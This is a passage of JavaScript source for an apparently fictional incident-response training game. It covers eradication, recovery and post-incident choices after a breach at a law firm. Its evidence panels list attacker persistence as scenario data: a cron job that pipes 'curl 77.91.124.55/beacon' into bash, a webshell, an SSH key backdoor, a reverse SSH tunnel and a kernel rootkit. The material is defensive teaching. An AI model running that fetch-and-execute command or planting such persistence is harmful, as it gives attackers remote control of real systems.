          : f.scope === 'db'
            ? 'Investigation mapped the database exposure; the file share is still a guess. '
            : 'Investigation treated this as a standard breach; the privileged exposure is unmapped. ')
          + 'Now remove all attacker access and close the vulnerabilities. The zero-day hasn\'t been patched by the vendor yet — you need a mitigation strategy.'
          + (f.rootkitKnown ? ' You also know PORTAL-PROD-01 is carrying a kernel rootkit.' : '')
          + (f.saw_privesc ? ' You documented root on the portal at 12:18; nothing on these hosts can be trusted from that minute on.' : ''),
        evidence: {
          title: 'REMEDIATION INVENTORY',
          content: f => `<span class="log-highlight">ATTACKER PERSISTENCE:</span>
  [1] Webshell: /opt/tomcat/webapps/ROOT/images/logo.jsp${f.evidenceDestroyed ? ' (deleted) + /portal/static/js/err.jsp (re-dropped)' : ''}
  [2] Root backdoor: /root/.ssh/authorized_keys (attacker key added)
  [3] Cron job: */5 * * * * curl 77.91.124.55/beacon | bash
  [4] DB-LEGAL-01: reverse SSH tunnel (autossh service)${f.internalOpen ? ' — <span class="log-highlight">ACTIVE</span>' : ' — isolated'}
  [5] Staged data: /tmp/.data/ on 2 servers${f.rootkitKnown ? `
  [6] PORTAL-PROD-01: LKM rootkit nf_conntrack_ext + /etc/modules-load.d entry` : ''}${f.rogueAccount ? `
  [${f.rootkitKnown ? 7 : 6}] DC-ATLAS-01: rogue Domain Admin svc_backup2 — <span class="log-highlight">ENABLED</span>` : ''}

<span class="log-highlight">VULNERABILITIES:</span>
  - Java deserialization: CVE pending (no vendor patch available)
    ${f.saw_endpoint ? 'Reproducer on file: POST /portal/api/document/preview, serialized body' : 'Vulnerable endpoint not documented — WAF alert only'}
  - Kernel privilege escalation: CVE-2023-32233 (patch available)
  - Plaintext credentials in application config
  - Password reuse (portal_svc) across OS and database
  - No network segmentation between DMZ and internal network
  - WAF in detect-only mode (not blocking)

<span class="log-highlight">CREDENTIALS TO ROTATE:</span>
  - portal_svc (database + OS)
  - LDAP bind credentials
  - All domain user passwords (LDAP enumeration)
  - root passwords on all 3 compromised servers
  - SSH host keys on compromised systems`
        },
        choices: [
          {
            key: 'A',
            label: 'Remove all persistence, rebuild compromised servers, deploy WAF blocking + virtual patch for zero-day, rotate all credentials',
            desc: 'Comprehensive eradication: clean persistence, rebuild from clean media, deploy WAF virtual patch to block deserialization payloads until vendor patches, credential rotation, and network segmentation.',
            quality: 'good',
            score: { time: 5, containment: 15, evidence: 5, thoroughness: 20 },
            sets: f => ({
              rebuilt: true, rootkitLive: false, dbPersist: false, rogueAccount: false, internalOpen: false,
              virtualPatch: f.saw_endpoint ? 'precise' : 'generic',
              vendor: f.saw_endpoint ? 'confirmed' : 'unconfirmed',
            }),
            outcome: f => {
              const count = 5 + (f.rootkitKnown ? 1 : 0) + (f.rogueAccount ? 1 : 0);
              return `All ${count} persistence mechanisms removed. Three servers rebuilt from known-good media with updated kernels`
                + (f.rootkitKnown ? '. ' : ', and the kernel rootkit nobody found on PORTAL-PROD-01 goes out with the old disks. ')
                + (f.rogueAccount ? 'A Domain Admins membership review during the credential sweep catches svc_backup2, which is removed. ' : '')
                + (f.saw_endpoint
                  ? 'WAF switched to blocking mode with a virtual patch scoped to POST /portal/api/document/preview that rejects Java serialized bodies, raw or base64-wrapped (rO0AB...). The vendor gets your reproducing request under coordinated disclosure, confirms it within a day and reserves a CVE. '
                  : 'WAF switched to blocking mode with a generic rule on the application/x-java-serialized-object content type, the only detail in your notes. The vendor gets a report but no reproducing request, and is still trying to reproduce it. ')
                + 'All credentials rotated. Network segmentation implemented: DMZ servers can only reach specific internal ports. Secret management deployed for application credentials. Zero-day mitigated until vendor patch arrives.';
            },
          },
          {
            key: 'B',
            label: 'Remove persistence and rotate credentials, take the portal offline until a vendor patch is available',
            desc: 'Clean up and wait for a real fix. Don\'t bring the portal back until the zero-day is patched.',
            quality: 'partial',
            score: { time: -5, containment: 10, evidence: 0, thoroughness: 5 },
            sets: f => ({
              rootkitLive: !f.rootkitKnown, dbPersist: false, rogueAccount: false, internalOpen: false,
              portalOffline: true, vendor: 'confirmed',
            }),
            outcome: f => 'Persistence removed and credentials rotated — good. '
              + (f.rootkitKnown
                ? 'You pull nf_conntrack_ext and its modules-load.d entry too, since you know it is there, though a host that lost root is only as clean as what you found on it. '
                : 'But the servers are cleaned in place, not rebuilt, and the kernel rootkit nobody found stays loaded on PORTAL-PROD-01 behind a clean-looking lsmod. ')
              + (f.saw_endpoint
                ? 'The vendor reproduces from your request the same day and ships a fix in 2 weeks. The portal stays offline for those 2 weeks. '
                : 'With only the WAF alert to go on, the vendor needs 3 weeks to reproduce and patch. The portal stays offline for 3 weeks. ')
              + 'Attorneys and clients can\'t access case documents. Atlas reverts to email for document sharing, which creates new security risks. The firm\'s operations are severely impacted. When the portal comes back, the network segmentation issue still isn\'t addressed.',
          },
          {
            key: 'C',
            label: 'Focus on the portal server — the internal servers weren\'t the real target',
            desc: 'The attacker wanted the portal data. Clean and restore the portal. Handle internal servers separately.',
            quality: 'bad',
            score: { time: 10, containment: -5, evidence: -5, thoroughness: -15 },
            sets: f => ({ rootkitLive: !f.rootkitKnown }),
            outcome: f => 'Portal cleaned and restored. '
              + (f.rootkitKnown ? '' : 'Cleaned, not rebuilt: the kernel rootkit nobody found is still loaded on it. ')
              + 'But DB-LEGAL-01 still has the reverse SSH tunnel — the attacker maintains access to the billing database and HR records. The LDAP credentials are still compromised. Two weeks later, a ransomware payload is deployed via the persistent access on DB-LEGAL-01, encrypting case documents and billing records.',
          },
        ],
        live: 'ZERO-DAY: NO VENDOR PATCH · WAF: DETECT-ONLY',
        timeline: [
          { at: 8, sev: 'warn', text: 'WAF (detect): serialized POST to /portal/api/document/preview from 185.220.101.47 — logged, not blocked', score: { thoroughness: -3 } },
        ],
        siemEntries: f => [
          { time: '17:00', sev: 'info', text: `Eradication: removing ${5 + (f.rootkitKnown ? 1 : 0) + (f.rogueAccount ? 1 : 0)} persistence mechanisms` },
          { time: '17:10', sev: 'success', text: 'Webshell and cron backdoor removed' },
          { time: '17:15', sev: 'warn', text: 'Zero-day: no vendor patch available yet' },
        ],
      },
      { // RECOVERY
        name: 'RECOVERY',
        carried: f => {
          const out = [];
          if (f.dbPersist) out.push({
            text: 'DB-LEGAL-01 was never cleaned. The autossh unit is still installed and reconnects the moment the host is back on the network.',
            score: { containment: -10 },
          });
          if (f.rootkitLive && !f.portalOffline) out.push({
            text: 'The restored portal still carries nf_conntrack_ext. It beaconed to 77.91.124.55 within an hour of going live.',
            score: { containment: -10 },
          });
          if (f.leakPosted) out.push({
            sev: 'info',
            text: 'The leak-site listing is public. Some clients will read about this before they hear from Atlas.',
          });
          return out;
        },
        narrative: f => (f.rebuilt
          ? 'Attacker persistence is removed and servers are rebuilt. '
          : f.portalOffline
            ? 'Persistence is cleaned out, and the vendor patch has landed after the portal sat dark waiting for it. '
            : 'The portal was cleaned and put back into service; the internal servers were left for later. ')
          + 'Atlas needs to restore client access to the portal, manage the legal privilege implications, and address the ethical and regulatory notification requirements.',
        evidence: {
          title: 'RECOVERY STATUS',
          content: f => {
            const n = wrcFolders(f.exfilMin);
            return `<span class="log-ok">SYSTEM STATUS:</span>
  - PORTAL-PROD-01: ${f.rebuilt ? 'Rebuilt, patched, WAF blocking ✓' : f.portalOffline ? 'Cleaned in place, vendor patch applied ✓' : '<span class="log-warn">Cleaned in place, back in service, WAF still detect-only</span>'}
  - DB-LEGAL-01: ${f.rebuilt ? 'Rebuilt, credentials rotated ✓' : f.dbPersist ? '<span class="log-highlight">Not addressed ✗</span>' : 'Cleaned, credentials rotated ✓'}
  - FS-LEGAL-01: Cleaned, access audited ✓
  - Network segmentation: ${f.rebuilt ? 'Implemented ✓' : '<span class="log-warn">Not implemented</span>'}
  - Portal: Ready for service restoration

<span class="log-warn">LEGAL & ETHICAL OBLIGATIONS:</span>
  - Client notification (Model Rule 1.4, ABA Formal Op. 483):
    ${f.scope === 'full'
      ? `3,200 clients in the database dump + ${n} litigation matters with case files taken — mapped matter by matter`
      : f.scope === 'db'
        ? '3,200 clients in the database dump — <span class="log-highlight">file-share matters NOT mapped</span>'
        : '<span class="log-highlight">Not scoped — privileged exposure never catalogued</span>'}
  - Bar: no general self-report duty; ethics counsel to confirm per jurisdiction
  - Malpractice insurance: Carrier notification required
  - Opposing counsel: Notification may be ethically required
    (if case strategy documents were compromised)
  - Regulatory: State breach notification for 145 employees (SSNs) and client bank details

<span class="log-warn">REPUTATIONAL RISK:</span>
  - Atlas represents Fortune 500 clients in high-profile litigation
  - M&A deal information could move markets
  - Class action case strategy exposure could undermine ongoing litigation
  - ${f.leakPosted ? '<span class="log-highlight">Data already listed on a leak site</span>' : 'Media coverage likely if breach becomes public'}`;
          }
        },
        choices: [
          {
            key: 'A',
            label: 'Staged portal restoration, client notifications per ethics counsel, bar reporting where required, malpractice carrier notification',
            desc: 'Coordinated recovery: restore portal with enhanced security, execute client notifications per legal ethics guidance, report to bar authorities where a jurisdiction requires it, and notify malpractice carrier.',
            quality: 'good',
            // Notices are only as good as the scope behind them
            score: f => f.scope === 'full' ? { time: 5, containment: 5, evidence: 10, thoroughness: 20 }
              : f.scope === 'db' ? { time: 5, containment: 5, evidence: 5, thoroughness: 10 }
              : { time: 0, containment: 5, evidence: 0, thoroughness: 5 },
            sets: { notice: 'matter', ethicsCounsel: true },
            outcome: f => {
              const n = wrcFolders(f.exfilMin);
              const portal = f.rebuilt ? 'Portal restored with WAF blocking, network segmentation, and enhanced monitoring. '
                : f.portalOffline ? 'Portal restored on the vendor\'s patched build. '
                : 'The portal is already back in service. ';
              const notices = f.scope === 'full'
                ? `Ethics counsel guides personalized client notifications: each of the ${n} litigation clients is told which of their case files were taken${f.manifest ? ', document by document' : ''}, and the 3,200 clients in the database dump each receive specific information about what was exposed in their matter. `
                  + (f.saw_mnpi
                    ? 'The 8 M&A clients are called first, with sufficient time to assess market implications of the MNPI in their folders. '
                    : 'The M&A clients get the same letter as everyone else; nobody flagged the MNPI in their folders, and two of them hear what it means from their own deal counsel. ')
                : f.scope === 'db'
                  ? `Ethics counsel works from the database catalogue: the 3,200 clients get matter-specific notices. But the file share was never scoped, so the ${n} litigation clients whose case strategy documents were taken are told only that "portal database records" were affected. Ethics counsel flags that as an incomplete notice under Rule 1.4. `
                  : 'Ethics counsel has nothing to notify from: investigation never catalogued the privileged exposure. Scoping the file share now pushes the client notices out three weeks, well behind the state breach notices to employees. ';
              return portal + notices
                + 'Bar authorities contacted where a jurisdiction requires it. Malpractice carrier engaged early — coverage confirmed.';
            },
          },
          {
            key: 'B',
            label: 'Restore the portal and send a blanket breach notification to all clients',
            desc: 'Standard breach notification to the full client base. Everyone gets the same letter.',
            quality: 'partial',
            score: { time: 10, containment: 0, evidence: 0, thoroughness: 0 },
            sets: { notice: 'blanket' },
            outcome: 'Portal restored and blanket notification sent. But a one-size-fits-all notification doesn\'t address the specific privilege implications for each matter. Class action clients don\'t know their case strategy was exposed. M&A clients aren\'t warned about MNPI exposure. The notification feels like a generic form letter, damaging client trust. Ethics counsel says the generic approach may not satisfy the duty to tell each client what happened in their matter.',
          },
          {
            key: 'C',
            label: 'Restore the portal quietly — the fewer people who know about this, the better',
            desc: 'Minimize the blast radius. If we don\'t publicize it, maybe the data won\'t surface.',
            quality: 'bad',
            score: { time: 15, containment: -10, evidence: -5, thoroughness: -20 },
            sets: { notice: 'none' },
            outcome: f => (f.leakPosted ? 'The data is already on a leak site, so there is nothing quiet about it. ' : '')
              + 'The portal comes back up with no notification. Three weeks later, a class action opposing counsel files a motion using information that could only have come from Atlas\'s internal case files. The court orders an investigation. Atlas\'s failure to notify clients results in sanctions, disciplinary proceedings, and a cascade of malpractice claims. The managing partner faces personal bar complaints.',
          },
        ],
        live: f => `CLIENTS AWAITING NOTICE: 3,200${f.leakPosted ? ' · CASE FILES ON LEAK SITE' : ''}`,
        timeline: [
          { at: 6, when: f => f.leakPosted, sev: 'warn', text: 'Legal trade reporter asks Atlas to comment on the leak-site listing', score: { thoroughness: -3 } },
          { at: 10, sev: 'info', text: 'Malpractice carrier: notice-of-circumstances window closes in 48 hours' },
        ],
        siemEntries: f => [
          { time: '19:00', sev: 'info', text: 'Recovery: portal restoration and notification planning' },
          { time: '19:15', sev: f.rebuilt ? 'success' : 'warn', text: f.rebuilt ? 'Portal ready with WAF blocking and network segmentation' : 'Portal restoration: no network segmentation in place' },
          { time: '19:20', sev: 'warn', text: `${wrcFolders(f.exfilMin)} litigation matters + 3,200 clients require privilege notifications` },
        ],
      },
      { // POST-INCIDENT
        name: 'POST-INCIDENT',
        carried: f => {
          const out = [];
          const n = wrcFolders(f.exfilMin);
          if (f.virtualPatch === 'generic') out.push({
            text: 'Day 3 after restore: a base64-wrapped gadget chain inside a JSON field walked past the generic content-type rule. Tomcat-level RCE again. The patched kernel and new segmentation held and EDR killed it in 20 minutes, but the portal went dark for another day.',
            score: { containment: -8 },
          });
          if (f.virtualPatch === 'none' && !f.portalOffline && !f.rebuilt) out.push({
            text: 'The portal went back into service with the zero-day unpatched and the WAF still in detect mode.',
            score: { containment: -5 },
          });
          if (f.notice === 'matter' && f.scope === 'db') out.push({
            text: `${n} litigation clients were never told their case strategy files were taken. Two found out ${f.leakPosted ? 'from the leak site' : 'from opposing counsel'}.`,
            score: { thoroughness: -5 },
          });
          const present = wrcPresent(f);
          if (present.length) out.push({
            text: `You are writing the report while the attacker still holds: ${present.join('; ')}.`,
            score: { thoroughness: -10 },
          });
          return out;
        },
        narrative: 'The portal is restored, clients are being notified, and the immediate crisis is managed. Atlas\'s executive committee wants a comprehensive review. This breach struck at the heart of what a law firm protects: attorney-client privilege.',
        evidence: {
          title: 'INCIDENT SUMMARY',
          content: (f, st) => {
            const n = wrcFolders(f.exfilMin);
            const mb = wrcMB(n);
            const present = wrcPresent(f);
            return `<span class="log-ok">TIMELINE:</span>
  Zero-day exploit:   Mar 10 12:14
  Root access:        Mar 10 12:18 (4 min to root)
  Data exfiltration:  Mar 10 12:25-12:45 (3.9 GB databases)
  Lateral movement:   Mar 10 12:35-13:00
  Detection:          Mar 10 13:55 (1h 40min delay)
  Case-file stream:   Mar 10 13:00-${f.exfilMin >= 24 ? 'completion' : wrcAt(f.exfilMin)} (${n} of 47 folders)
  Time on incident:   ${formatElapsed(st.elapsed)}

<span class="log-warn">DATA EXPOSURE:</span>
  - 12,400 case records + 89,000 documents (database)
  - 3,200 client billing records with bank details
  - 145 employee PII records
  - 47 active litigation case folders (${n} confirmed exfiltrated, ~${mb} MB)
  - Total exfiltrated: ~${((3900 + mb) / 1000).toFixed(1)} GB

<span class="log-warn">ATTACKER ACCESS AT CLOSE:</span>
  ${present.length ? `<span class="log-highlight">${present.join('; ')}</span>` : 'None found — hosts rebuilt or cleaned of all known persistence'}

<span class="log-warn">ROOT CAUSES:</span>
  1. Unpatched application with zero-day (but detect-only WAF)
  2. Kernel vulnerability unpatched (privilege escalation)
  3. Plaintext credentials in config files
  4. Password reuse across systems
  5. No DMZ-to-internal network segmentation
  6. 1h 40min alert-to-investigation delay
  7. No application-layer monitoring (only WAF alerts)

<span class="log-warn">ESTIMATED COST:</span>
  - Forensic investigation: ~$250K
  - Client notifications: ${f.notice === 'matter' ? '~$180K (individualized, ethics-guided)' : f.notice === 'blanket' ? '~$60K (one generic letter)' : 'none sent'}
  - Malpractice exposure: ~$5-15M (depending on outcomes)
  - Bar association proceedings: ~$200K legal defense
  - Security remediation: ~$500K
  - Reputational damage: Incalculable`;
          }
        },
        choices: [
          {
            key: 'A',
            label: 'Full report with application security program, privilege protection framework, and incident response maturity plan',
            desc: 'Comprehensive post-incident: zero-day response lessons, application security program design, legal data classification and protection framework, and an IR maturity plan addressing the detection delay.',
            quality: 'good',
            // A report is only as good as what was documented along the way
            score: (f, st) => ({ time: 5, containment: 5, evidence: 10 + Math.min(6, st.findings.length), thoroughness: 25 }),
            outcome: (f, st) => (st.findings.length >= 6
                ? `The IOC appendix lists ${st.findings.length} findings documented during the response. `
                : `The IOC appendix is thin — ${st.findings.length} documented finding${st.findings.length === 1 ? '' : 's'} — and the malpractice carrier's forensic reviewer notices. `)
              + (f.saw_wafDetect ? 'The detect-only WAF, flagged at triage, heads the root-cause list. ' : '')
              + 'Report drives a fundamental security transformation: application security testing program (SAST/DAST), WAF always in blocking mode with virtual patching capability, secrets management replacing plaintext credentials, network segmentation between all tiers, legal data classification system with encryption at rest, and 15-minute alert-to-investigation SLA. Ethics counsel develops a standing privilege breach playbook. '
              + (wrcPresent(f).length
                ? 'But the report\'s "threat eradicated" section is wrong, and the rebuild it recommends is scheduled for next quarter.'
                : 'The firm becomes a model for law firm cybersecurity.'),
          },
          {
            key: 'B',
            label: 'Standard incident report with technical recommendations and patching improvements',
            desc: 'Cover the technical root causes and recommend patching, WAF, and credential management improvements.',
            quality: 'partial',
            score: { time: 10, containment: 0, evidence: 5, thoroughness: 5 },
            outcome: 'Technical recommendations are solid. But without addressing the legal-specific aspects — privilege protection, ethical obligations framework, and legal data classification — Atlas treats this as a generic IT security incident. They implement better patching and WAF blocking but don\'t develop a privilege breach response capability. The next breach (however it occurs) will cause the same ethical and legal scramble.',
          },
          {
            key: 'C',
            label: 'The vendor needs to patch the zero-day — this is their fault, not a security program failure',
            desc: 'Focus the report on the vendor\'s failure to prevent the deserialization vulnerability.',
            quality: 'bad',
            score: { time: 15, containment: -5, evidence: -10, thoroughness: -25 },
            outcome: 'Report blames the vendor. But 6 of 7 root causes were Atlas\'s responsibility: detect-only WAF, unpatched kernel, plaintext credentials, password reuse, no segmentation, and slow detection. The vendor patches the zero-day weeks later, but Atlas\'s systemic issues remain. The executive committee reads the report and sees finger-pointing, not solutions. Clients who retained outside security counsel for their own assessment share a much less flattering view of Atlas\'s security posture.',
          },
        ],
        siemEntries: f => [
          { time: '20:00', sev: 'info', text: 'Post-incident: comprehensive review and recommendations' },
          { time: '20:10', sev: 'warn', text: `Total exposure: 12,400 cases, 89,000 docs, ${wrcFolders(f.exfilMin)} litigation folders` },
          { time: '20:15', sev: 'info', text: 'Executive committee briefing — full report requested' },
        ],
      },
    ],
  }
);
